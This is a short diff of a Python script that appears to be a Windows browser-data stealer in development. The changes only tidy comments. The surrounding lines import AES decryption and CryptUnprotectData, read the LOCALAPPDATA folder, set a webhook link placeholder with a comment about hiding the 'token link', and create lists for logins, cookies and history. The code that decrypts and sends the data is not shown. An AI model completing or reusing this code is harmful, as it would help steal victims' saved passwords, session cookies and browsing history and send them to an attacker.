@@ -4,9 +4,9 @@ import base64 # to hide token link
 import shutil
 import sqlite3
 
-from Crypto.Cipher import AES # using pycryptodome or smth
+from Crypto.Cipher import AES # using pycryptodome
 
-from win32.win32crypt import CryptUnprotectData #using win32crypt from pywin32? i think
+from win32.win32crypt import CryptUnprotectData #using win32crypt from pywin32?
 
 
 webhookLink = "fill"
@@ -14,7 +14,7 @@ appdata = os.getenv("LOCALAPPDATA")
 local_appdata = os.getenv("LOCALAPPDATA")
 
 logins = []
-cookies = [] # idfk what cookies even do but m getting them
+cookies = []
 history = []
 
 # perhaps use os.join instead of +,
